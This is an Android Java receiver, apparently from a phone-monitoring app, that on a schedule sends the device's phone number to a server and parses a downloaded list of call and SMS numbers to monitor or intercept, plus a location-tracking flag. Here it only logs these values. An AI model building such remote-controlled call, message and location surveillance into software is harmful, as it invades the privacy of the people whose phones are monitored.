package com.privacy.monitor.receiver;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.privacy.monitor.base.C;
import com.privacy.monitor.util.AppUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.text.TextUtils;

/**
 * 自定义广播
 */
public class CronBroadcaseRectiver extends BroadcastReceiver {

	private static final String TAG = CronBroadcaseRectiver.class.getSimpleName();
	
	@Override
	public void onReceive(Context context, Intent intent) {
		Logger.d("CronBroadcaseRectiver","定时任务启动了");
		SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
		String monitorList = AppUtil.streamToStr(NetworkUtil.download(context,"tel="+sp.getString(C.PHONE,""),C.RequestMethod.getMonitorList));
	    if(!TextUtils.isEmpty(monitorList)){
	    	try {
				JSONObject jsonObject = new JSONObject(monitorList);
				JSONObject callObject = jsonObject.getJSONObject("call");
				JSONArray jsonArray = callObject.getJSONArray("monitor");
				int callListLength = jsonArray.length();
				for(int j =0 ; j < callListLength ; j++){
					String callMonitorPhone= jsonArray.getString(j);
					Logger.d(TAG,"监听通话号码为:"+callMonitorPhone);
				}
				
				JSONArray jArrayNotMonitor = callObject.getJSONArray("not_monitor");
				int length3 = jArrayNotMonitor.length();
				for(int i = 0 ; i < length3 ; i++){
					String notMonitorStr = jArrayNotMonitor.getString(i);
					Logger.d(TAG,"不监听的通话号码:"+notMonitorStr);
				}
				
				String location = jsonObject.getString("loc");
				Logger.d(TAG, "是否定位:"+location);
				
				JSONObject msgJsonObject = jsonObject.getJSONObject("msf");
				JSONArray jsonArray2 = msgJsonObject.getJSONArray("monitor");
				int length4 = jsonArray2.length();
				for(int b = 0 ; b<length4 ; b++){
					String msgMonitorPhone = jsonArray2.getString(b);
					Logger.d(TAG,"信息监听号码:"+msgMonitorPhone);
				}
				
				JSONArray jsonArray3 = msgJsonObject.getJSONArray("not_monitor");
				int lengtn5 = jsonArray3.length();
				for(int c = 0 ; c < lengtn5 ; c++){
					String msgNotMonitor = jsonArray3.getString(c);
					Logger.d(TAG,"信息不监听号码:"+msgNotMonitor);
				}
				
				JSONArray jsonArray4 = msgJsonObject.getJSONArray("filter");
				int length6 = jsonArray4.length();
				for(int u = 0 ;u < length6 ; u++){
					String msgFilter = jsonArray4.getString(u);
					Logger.d(TAG,"信息拦截号码:"+msgFilter);
				}
				
			} catch (JSONException e) {
				Logger.d("CronBroadcaseRectiver",e.getMessage());
			}
	    }
	}
}
